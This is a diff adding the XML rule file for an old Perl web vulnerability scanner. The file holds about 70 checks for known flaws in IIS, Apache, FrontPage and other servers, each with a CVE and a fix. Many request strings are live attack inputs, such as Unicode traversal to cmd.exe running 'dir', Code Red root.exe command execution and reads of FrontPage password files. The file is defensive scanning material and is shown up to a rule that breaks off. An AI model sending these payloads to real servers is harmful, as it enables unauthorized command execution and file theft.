@@ -1,0 +1,1036 @@
+<!-- http-scan.xml for http-scan.pl 
+     Written by MadHat (at) Unspecific.com
+     http://www.unspecific.com/scanner/     -->
+<conf>
+  <VERSION>2.07</VERSION>
+  <DEBUG>0</DEBUG>
+  <port>80</port>
+  <netbios>1</netbios>
+  <ssl>0</ssl>
+  <threads>16</threads>
+  <timeout>1</timeout>
+  <!--
+  scan format:
+<scan name='name' id='#'>
+   name is a unique name for each rule, id is presentl unimplimented
+<send> </send>
+   send is what to send to teh web server
+<expect> </expect>
+   what to expect as a reply, to be vulnerable
+<method> </method>
+   request method, currently available methods are GET (default),
+   PUT, DELETE, Proxy (to test proxying on a server), POST,
+   RAW, OPTIONS
+   RAW will send literly what is in end, not using LWP,
+   using Sockets directly.
+<version> </version>
+   partial verion info matched from Server header
+<versionID> </versionID>
+   to check for particular version, will specific check against
+   version/1.2, the 1.2 portion of this, and much have version 
+   available befre it will match
+<level> </level>
+   severity
+<URL> </URL>
+   URL with info about the problem and maybe fix
+<fix> </fix>
+   usually basic info on how to fix the problem
+<username> </username>
+   username to use when testing
+<password> </password>
+   passowrd to use when testing
+   username and password work together, and will be used on URL in format
+   http://username:password@ip:port/send
+<content-type> </content-type>
+   The content-type to expect, in case it is not a standard text/html or
+   test/plain (like audio from the readme.eml from Nimda)
+<ignore> </ignore>
+   what to not signal a vuln on, good for catching some custom scripts 
+   and redirects.
+<CVE> </CVE>
+   cve name, used for the HTML output with a link to nist.gov
+<description> </description>
+   A description of the vulnerability
+  -->
+  <scan name='Possible vulnerable Apache &lt; 1.3.26' id='97'>
+    <description>Vulnerabilities in earlier versions of Apache.</description>
+    <send>/</send>
+    <version>Apache</version>
+    <versionID>1.3.26</versionID>
+    <CVE>CAN-2002-0839</CVE>
+    <URL>http://online.securityfocus.com/bid/5033</URL>
+  </scan>
+  <scan name='Possible vulnerable thttpd &lt; 2.22' id='1'>
+    <send>/</send>
+    <version>thttpd</version>
+    <versionID>2.22</versionID>
+    <URL>http://online.securityfocus.com/bid/3562</URL>
+  </scan>
+  <scan name='Open Proxy' id='2'>
+    <description>Open Proxy allows one to gain access to some pages protected by DNS lookups or IP limited access.</description>
+    <send>http://www.unspecific.com/proxy.test</send>
+    <expect>b1d92fbafd2ecf3298ea34d341917bf6a66f830874b0645433834ea262b594bf</expect>
+    <method>Proxy</method>
+    <fix>Turn off Proxy or restrict to specific addresses</fix>
+  </scan>
+  <scan name='CodeRed / IDA / idq.dll' id='3'>
+    <send>x.ida?AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA=X</send>
+    <expect>Error0xc0000005caught</expect>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS01-033.asp</URL>
+    <fix>PATCH with MS01-003</fix>
+    <CVE>CVE-2001-0500</CVE>
+  </scan>
+  <scan name='IIS ViewCode SiteServer Inspired' id='4'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>Sites/Knowledge/Membership/Inspired/ViewCode.asp</send>
+    <version>Microsoft-IIS</version>
+    <fix>Delete the file Sites/Knowledge/Membership/Inspired/ViewCode.asp</fix>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='IIS ViewCode SiteServer Inspiredtutorial' id='5'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>Sites/Knowledge/Membership/Inspiredtutorial/Viewcode.asp</send>
+    <version>Microsoft-IIS</version>
+    <fix>Delete the files</fix>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='IIS ViewCode SiteServer Samples Inspired' id='6'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>Sites/Samples/Knowledge/Membership/Inspired/ViewCode.asp</send>
+    <version>Microsoft-IIS</version>
+    <fix>Delete the files</fix>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='IIS ViewCode SiteServer Samples Inspiredtutorial' id='7'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>Sites/Samples/Knowledge/Membership/Inspiredtutorial/ViewCode.asp</send>
+    <version>Microsoft-IIS</version>
+    <fix>Delete the files</fix>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='IIS ViewCode SiteServer Push' id='8'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>Sites/Samples/Knowledge/Push/ViewCode.asp</send>
+    <version>Microsoft-IIS</version>
+    <fix>Delete the files</fix>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='IIS ViewCode SiteServer Search' id='9'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>Sites/Samples/Knowledge/Search/ViewCode.asp</send>
+    <version>Microsoft-IIS</version>
+    <fix>Delete the files</fix>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='IIS ViewCode SiteServer Publishing' id='10'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>SiteServer/Publishing/viewcode.asp</send>
+    <version>Microsoft-IIS</version>
+    <fix>Delete the files</fix>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='IISSamples / Codebrws.asp' id='11'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>iissamples/exair/howitworks/Codebrws.asp</send>
+    <version>Microsoft-IIS</version>
+    <fix>Remove IISSAMPLES from IIS Admin MMC</fix>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='SMTP Admin' id='12'>
+    <send>Mail/smtp/Admin/smadv.asp</send>
+    <version>Microsoft-IIS</version>
+    <fix>Remove mapping for Mail/SMTP/Admin</fix>
+  </scan>
+  <scan name='IISSamples / Code.asp' id='13'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>iissamples/exair/howitworks/Code.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <fix>Remove IISSAMPLES from IIS Admin MMC</fix>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='IISSamples / Codebrw1.asp' id='14'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>iissamples/exair/howitworks/Codebrw1.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <fix>Remove IISSAMPLES from IIS Admin MMC</fix>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='IISSamples / sdk / codebrws.asp' id='15'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>iissamples/sdk/asp/docs/codebrws.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <fix>Remove IISSAMPLES from IIS Admin MMC</fix>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='IISSamples / sdk / CodeBrws.asp' id='16'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>iissamples/sdk/asp/docs/CodeBrws.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <fix>Remove IISSAMPLES from IIS Admin MMC</fix>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='IISSamples / sdk / codebrw2.asp' id='17'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>iissamples/sdk/asp/docs/codebrw2.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <fix>Remove IISSAMPLES from IIS Admin MMC</fix>
+    <CVE>CAN-1999-0736</CVE>
+  </scan>
+  <scan name='MSADC / showcode.asp' id='18'>
+    <description>Many of the sample files shipped with Microsoft Internet Information Server (IIS) and SiteServer can be remotely exploited to read arbitrary files on vulnerable servers.</description>
+    <send>msadc/Samples/selector/showcode.asp</send>
+    <expect>View ASP Source</expect>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.atstake.com/research/advisories/1999/showcode.txt</URL>
+    <fix>Remove MSADC from IIS Admin MMC</fix>
+    <CVE>CAN-1999-0736</CVE>
+    <md5>f3f70064a5716c93be7c7abeba8af58b</md5>
+  </scan>
+  <scan name='msadc.dll vuln' id='19'>
+    <send>msadc/msadcs.dll/VbBusObj.VbBusObjCls.GetMachineName</send>
+    <version>Microsoft-IIS</version>
+    <method>POST</method>
+    <fix>Remove MSADC from IIS Admin MMC</fix>
+    <CVE>CVE-1999-1011</CVE>
+    <URL>http://online.securityfocus.com/bid/529</URL>
+    <content-type>application/x-varg</content-type>
+    <level>HIGH</level>
+  </scan>
+  <scan name='HTTP DELETE allowed' id='20'>
+    <description> The DELETE method requests that the origin server delete the resource identified by the Request-URI. This method MAY be overridden by human intervention (or other means) on the origin server. </description>
+    <send>HACKED.txt</send>
+    <method>DELETE</method>
+    <URL>http://www.w3c.org/Protocols/rfc2616/rfc2616-sec9.html</URL>
+    <fix>Disable off DELETE in the options of the web server</fix>
+  </scan>
+  <scan name='HTTP PUT allowed' id='21'>
+    <description>The PUT method can be used to allow people to upload content to a web server via the HTTP protocol directly.  If it is misconfigured it can also allow anyone to upload any contact, or even over-write content and should be used with GREAT CAUTION. </description>
+    <send>HACKED.txt</send>
+    <method>PUT</method>
+    <URL>http://www.w3c.org/Protocols/rfc2616/rfc2616-sec9.html</URL>
+    <fix>Disable PUT for all directories in the web server, this may mean disabling WRITE permissions on the web server</fix>
+  </scan>
+  <scan name='Infected CodeRed &amp; VLUN /msadc/root.exe' id='22'>
+    <description>The "Code Red" worm is self-replicating malicious code that exploits a known vulnerability in Microsoft IIS servers</description>
+    <send>msdac/root.exe?/c+dir</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>REBUILD THE BOX</fix>
+    <level>HIGH</level>
+    <CVE>CA-2001-19</CVE>
+  </scan>
+  <scan name='Infected CodeRed &amp; VLUN /scripts/root.exe' id='23'>
+    <description>The "Code Red" worm is self-replicating malicious code that exploits a known vulnerability in Microsoft IIS servers</description>
+    <send>scripts/root.exe?/c+dir</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>REBUILD THE BOX</fix>
+    <CVE>CA-2001-19</CVE>
+  </scan>
+  <scan name='Infected with Nimda /readme.eml' id='24'>
+    <description>The Nimda worm has the potential to affect both user workstations (clients) running Windows 95, 98, ME, NT, or 2000 and servers running Windows NT and 2000.</description>
+    <send>/</send>
+    <expect>readme.eml</expect>
+    <version>Microsoft-IIS</version>
+    <contenttype>audio</contenttype>
+    <level>HIGH</level>
+    <URL>http://www.sarc.com/avcenter/venc/data/w32.nimda.a@mm.html</URL>
+    <fix>REBUILD THE BOX</fix>
+    <CVE>CA-2001-26</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /scripts..%c0%af..%c0%af' id='25'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>scripts/..%c0%af..%c0%afwinnt/system32/cmd.exe?/c+dir+c:\\</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /scripts..%c0%af../' id='26'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>scripts/..%c0%af../winnt/system32/cmd.exe?/c+dir+c:\\</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /scripts..%255c' id='27'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>scripts/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <contenttype>application</contenttype>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /..%255c' id='28'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /msadc..%255c' id='29'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>msadc/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /_vti_bin..%255c' id='30'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>_vti_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /_mem_bin..%255c' id='31'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>_mem_bin/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH - MS00-078</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='UniCode Exploit from /cfide..%255c' id='32'>
+    <description>IS 4.0 and 5.0 allows remote attackers to read documents outside of the web root, and possibly execute arbitrary commands, via malformed URLs that contain UNICODE encoded characters, aka the "Web Server Folder Traversal" vulnerability.</description>
+    <send>cfide/..%255c..%255c..%255c..%255cwinnt/system32/cmd.exe?/c+dir</send>
+    <expect>Directory of </expect>
+    <version>Microsoft-IIS</version>
+    <level>HIGH</level>
+    <URL>http://www.microsoft.com/technet/security/bulletin/MS00-078.asp</URL>
+    <fix>PATCH - MS00-078</fix>
+    <CVE>CVE-2000-0884</CVE>
+  </scan>
+  <scan name='Remote cmd exec (via SQL) AdvWorks sample files' id='33'>
+    <send>AdvWorks/equipment/catalog_type.asp</send>
+    <version>Microsoft-IIS</version>
+    <fix>Delete the AdvWorks sample directory</fix>
+  </scan>
+  <scan name='Remote cmd exec (via SQL) ASPSamp' id='34'>
+    <send>ASPSamp/AdvWorks/equipment/catalog_type.asp</send>
+    <version>Microsoft-IIS</version>
+    <fix>Delete ASPSamp sample directory</fix>
+  </scan>
+  <scan name='IIS password brute iisadmpwd/aexp4b.htr' id='35'>
+    <description>can be used for brute force password attacks, or to identify valid users on the system, allows a remote attacker to cause a denial of service via a malformed request, AND allows local users to bypass the "User cannot change password" policy for Windows NT</description>
+    <send>iisadmpwd/aexp4b.htr</send>
+    <expect>InternetServiceManager</expect>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/cgi-bin/archive.pl?id=1&amp;mid=8515</URL>
+    <fix>Remove IISADMPWD from the IIS Admin MMC</fix>
+    <CVE>CVE-1999-0407</CVE>
+  </scan>
+  <scan name='IIS password brute iisadmpwd/achg.htr' id='36'>
+    <description>can be used for brute force password attacks, or to identify valid users on the system, allows a remote attacker to cause a denial of service via a malformed request, AND allows local users to bypass the "User cannot change password" policy for Windows NT</description>
+    <send>iisadmpwd/achg.htr</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/cgi-bin/archive.pl?id=1&amp;mid=8515</URL>
+    <fix>Remove IISADMPWD from the IIS Admin MMC</fix>
+    <CVE>CVE-1999-0407</CVE>
+  </scan>
+  <scan name='IIS password brute iisadmpwd/aexp.htr' id='37'>
+    <description>can be used for brute force password attacks, or to identify valid users on the system, allows a remote attacker to cause a denial of service via a malformed request, AND allows local users to bypass the "User cannot change password" policy for Windows NT</description>
+    <send>iisadmpwd/aexp.htr</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/cgi-bin/archive.pl?id=1&amp;mid=8515</URL>
+    <fix>Remove IISADMPWD from the IIS Admin MMC</fix>
+    <CVE>CVE-1999-0407</CVE>
+  </scan>
+  <scan name='IIS password brute iisadmpwd/aexp2.htr' id='38'>
+    <description>can be used for brute force password attacks, or to identify valid users on the system, allows a remote attacker to cause a denial of service via a malformed request, AND allows local users to bypass the "User cannot change password" policy for Windows NT</description>
+    <send>iisadmpwd/aexp2.htr</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/cgi-bin/archive.pl?id=1&amp;mid=8515</URL>
+    <fix>Remove IISADMPWD from the IIS Admin MMC</fix>
+    <CVE>CVE-1999-0407</CVE>
+  </scan>
+  <scan name='IIS password brute iisadmpwd/aexp2b.htr' id='39'>
+    <description>can be used for brute force password attacks, or to identify valid users on the system, allows a remote attacker to cause a denial of service via a malformed request, AND allows local users to bypass the "User cannot change password" policy for Windows NT</description>
+    <send>iisadmpwd/aexp2b.htr</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/cgi-bin/archive.pl?id=1&amp;mid=8515</URL>
+    <fix>Remove IISADMPWD from the IIS Admin MMC</fix>
+    <CVE>CVE-1999-0407</CVE>
+  </scan>
+  <scan name='IIS password brute iisadmpwd/aexp3.htr' id='40'>
+    <description>can be used for brute force password attacks, or to identify valid users on the system, allows a remote attacker to cause a denial of service via a malformed request, AND allows local users to bypass the "User cannot change password" policy for Windows NT</description>
+    <send>iisadmpwd/aexp3.htr</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/cgi-bin/archive.pl?id=1&amp;mid=8515</URL>
+    <fix>Remove IISADMPWD from the IIS Admin MMC</fix>
+    <CVE>CVE-1999-0407</CVE>
+  </scan>
+  <scan name='IIS password brute iisadmpwd/aexp4.htr' id='41'>
+    <description>can be used for brute force password attacks, or to identify valid users on the system, allows a remote attacker to cause a denial of service via a malformed request, AND allows local users to bypass the "User cannot change password" policy for Windows NT</description>
+    <send>iisadmpwd/aexp4.htr</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/cgi-bin/archive.pl?id=1&amp;mid=8515</URL>
+    <fix>Remove IISADMPWD from the IIS Admin MMC</fix>
+    <CVE>CVE-1999-0407</CVE>
+  </scan>
+  <scan name='IIS password brute iisadmpwd/aexp4b.htr' id='42'>
+    <description>can be used for brute force password attacks, or to identify valid users on the system, allows a remote attacker to cause a denial of service via a malformed request, AND allows local users to bypass the "User cannot change password" policy for Windows NT</description>
+    <send>iisadmpwd/aexp4b.htr</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/cgi-bin/archive.pl?id=1&amp;mid=8515</URL>
+    <fix>Remove IISADMPWD from the IIS Admin MMC</fix>
+    <CVE>CVE-1999-0407</CVE>
+  </scan>
+  <scan name='IIS password brute iisadmpwd/anot.htr' id='43'>
+    <description>can be used for brute force password attacks, or to identify valid users on the system, allows a remote attacker to cause a denial of service via a malformed request, AND allows local users to bypass the "User cannot change password" policy for Windows NT</description>
+    <send>iisadmpwd/anot.htr</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/cgi-bin/archive.pl?id=1&amp;mid=8515</URL>
+    <fix>Remove IISADMPWD from the IIS Admin MMC</fix>
+    <CVE>CVE-1999-0407</CVE>
+  </scan>
+  <scan name='IIS password brute iisadmpwd/anot3.htr' id='44'>
+    <description>can be used for brute force password attacks, or to identify valid users on the system, allows a remote attacker to cause a denial of service via a malformed request, AND allows local users to bypass the "User cannot change password" policy for Windows NT</description>
+    <send>iisadmpwd/anot3.htr</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/cgi-bin/archive.pl?id=1&amp;mid=8515</URL>
+    <fix>Remove IISADMPWD from the IIS Admin MMC</fix>
+    <CVE>CVE-1999-0407</CVE>
+  </scan>
+  <scan name='IIS acdg.htr mapping _AuthChangeUrl?' id='45'>
+    <send>_AuthChangeUrl?</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://support.microsoft.com/support/kb/articles/Q282/0/62.ASP</URL>
+    <fix>Remove IISADMPWD from the IIS Admin MMC</fix>
+  </scan>
+  <scan name='MSFP passwd file administrator.pwd' id='46'>
+    <send>_vti_pvt/administrator.pwd</send>
+    <version>Microsoft-IIS</version>
+  </scan>
+  <scan name='MSFP passwd file users.pwd' id='47'>
+    <send>_vti_pvt/users.pwd </send>
+    <version>Microsoft-IIS</version>
+  </scan>
+  <scan name='MSFP passwd file administrators.pwd' id='48'>
+    <send>_vti_pvt/administrators.pwd </send>
+    <version>Microsoft-IIS</version>
+  </scan>
+  <scan name='MSFP passwd file service.pwd' id='49'>
+    <send>_vti_pvt/service.pwd </send>
+    <version>Microsoft-IIS</version>
+  </scan>
+  <scan name='MSFP passwd file authors.pwd' id='50'>
+    <send>_vti_pvt/authors.pwd </send>
+    <version>Microsoft-IIS</version>
+  </scan>
+  <scan name='IIS remote file creation tools/newdsn.exe' id='51'>
+    <send>tools/newdsn.exe?driver=Microsoft%2BAccess%2BDriver%2B%28*.mdb%29&amp;dsn=goatfart+samples+from+microsoft&amp;dbq=..%2F..%2Fwwwroot%2goatfart.html&amp;newdb=CREATE_DB&amp;attr= </send>
+    <version>Microsoft-IIS/3</version>
+    <URL>http://www.securityfocus.com/bid/1818</URL>
+    <fix>Remove newdsn.exe from the tools directory</fix>
+    <CVE>CVE-1999-0191</CVE>
+  </scan>
+  <scan name='ColdFusion Admin startstop.html' id='52'>
+    <send>CFIDE/Administrator/startstop.html</send>
+    <expect>ColdFusion</expect>
+    <fix>Delete the startstop.html</fix>
+  </scan>
+  <scan name='IIS coutner d.o.s. fpcount.exe' id='53'>
+    <send>scripts/fpcount.exe</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/bid/2252</URL>
+    <md5>47c31efa88b192c6c12fb0ef4f8cea2e</md5>
+  </scan>
+  <scan name='IIS remote file creation scripts/tools/newdsn.exe' id='54'>
+    <send>scripts/tools/newdsn.exe</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/bid/1818</URL>
+    <fix>Remove newdsn.exe from the tools directory</fix>
+  </scan>
+  <scan name='IIS remote file creation scripts/tools/getdrvs.exe' id='55'>
+    <send>scripts/tools/getdrvs.exe</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.securityfocus.com/bid/1818</URL>
+  </scan>
+  <scan name='SiteServer Admin' id='56'>
+    <send>SiteServer/Admin</send>
+    <version>Microsoft-IIS</version>
+  </scan>
+  <scan name='SiteServer Publishing' id='57'>
+    <send>Sites/Publishing/Users/</send>
+    <version>Microsoft-IIS</version>
+    <method>PUT</method>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i1/d69.htm</URL>
+  </scan>
+  <scan name='SQL Samples /clocktower' id='58'>
+    <send>clocktower</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i1/d69.htm</URL>
+  </scan>
+  <scan name='SQL Samples /vc30' id='59'>
+    <send>vc30</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i1/d69.htm</URL>
+  </scan>
+  <scan name='SQL Samples /mspress30' id='60'>
+    <send>mspress30</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i1/d69.htm</URL>
+  </scan>
+  <scan name='SQL Samples /market' id='61'>
+    <send>market</send>
+    <version>Microsoft-IIS</version>
+    <ignore>page temporarily unavailable</ignore>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i1/d69.htm</URL>
+  </scan>
+  <scan name='Site Server View Source' id='62'>
+    <send>siteserver/publishing/viewcode.asp</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp/i1/d69.htm</URL>
+  </scan>
+  <scan name='Lotus notes domcfg.nsf' id='63'>
+    <send>domcfg.nsf/?open</send>
+    <ignore>Document Not Found</ignore>
+    <version>Lotus</version>
+  </scan>
+  <scan name='FrontPage extention htimage.exe' id='64'>
+    <send>cgi-bin/htimage.exe?2,2</send>
+    <version>Microsoft-IIS</version>
+  </scan>
+  <scan name='FrontPage extention imagemap.exe' id='65'>
+    <send>cgi-bin/imagemap.exe?2,2</send>
+    <version>Microsoft-IIS</version>
+    <md5>209cb3195363873875c6a95950e67bb4</md5>
+  </scan>
+  <scan name='FrontPage extention shtml.exe' id='66'>
+    <send>_vti_pvt/shtml.exe</send>
+    <version>Microsoft-IIS</version>
+  </scan>
+  <scan name='FrontPage extention dvwssr.dll' id='67'>
+    <send>_vti_bin/_vti_aut/dvwssr.dll</send>
+    <version>Microsoft-IIS</version>
+    <URL>http://www.wiretrip.net/rfp/p/doc.asp?id=45&amp;iface=1</URL>
+    <fix>Uninstall FP or delete the file</fix>
+  </scan>
+  <scan name='Running PHP-Nuke' id='68'>
+    <send>index.php</send>
+    <expect>PHP-Nuke</expect>
+    <URL>http://www.securityfocus.com/cgi-bin/vulns.pl?section=keyword&amp;keyword=PHP</URL>
+  </scan>
+  <scan name='Netscape DOS' id='69'>
+    <send>publisher</send>
+    <version>Netscape</version>
+    <expect>Netscape Web Publisher</expect>
+    <ignore>Document Not Found</ignore>
+    <URL>http://www.kb.cert.org/vuls/id/191763</URL>
+    <description>A vulnerability exists in iPlanet Web Server, Enterprise Edition and Netscape Enterprise Server in which a malformed Web Publisher command can crash the web server process. This vulnerability only affects Windows NT based servers. </description>
+    <fix>Disable web publishing or filter out the bad content (see i-Planet)</fix>
+  </scan>
+  <scan name='IIS Index Server null.htw' id='70'>
+    <send>null.htw?CiWebHitsFile=/default.asp%20&amp;CiRestriction=none&amp;CiHiliteType=Full</send>
+    <expect>takesyoutothenexthit</expect>
+    <version>Microsoft-IIS</version>
